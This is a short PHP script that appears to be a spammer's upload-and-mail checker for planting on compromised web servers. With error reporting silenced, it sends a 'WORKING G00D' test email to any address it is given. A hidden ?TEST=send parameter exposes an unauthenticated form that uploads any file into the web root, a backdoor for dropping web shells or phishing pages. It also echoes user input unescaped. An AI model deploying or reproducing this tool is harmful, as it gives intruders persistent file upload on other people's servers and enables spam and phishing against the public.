<?php
error_reporting(0);

?>
Upload is <b><color>GOOD</color></b><br>
Check  Sending Result ..<br>
<form method="post">
<input type="text" placeholder="EMail" name="email" value="<?php print $_POST['email']?>"required ><input type="text" placeholder="Order NUM" name="orderNUM" value="<?php print $_POST['orderid']?>" ><br>
<input type="submit" value="Send IT >>">
</form>
<br>
<?php
if($_GET['TEST'] =='send'){


$uploaddir = './';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if ( isset($_FILES["userfile"]) ) {
    echo "Upload ";
    if (move_uploaded_file
($_FILES["userfile"]["tmp_name"], $uploadfile))
echo $uploadfile;
    else echo "failed";
}


   echo "
<form name='uplform' method='post' action='?TEST=send'
enctype='multipart/form-data'>
<p align='center'>
<input type='file' name='userfile'>
<input type='submit'>
</p>
";
}


if (!empty($_POST['email'])){
	if (!empty($_POST['email'])){
		$xx =$_POST['orderNUM'];
	}
	else{
		$xx = rand();
	
	}
	mail($_POST['email'],"Result Test - ".$xx,"WORKING G00D");
	print "<b>send an report to Email- [".$_POST['email']."] - Order Is : $xx</b>"; 
}

?>
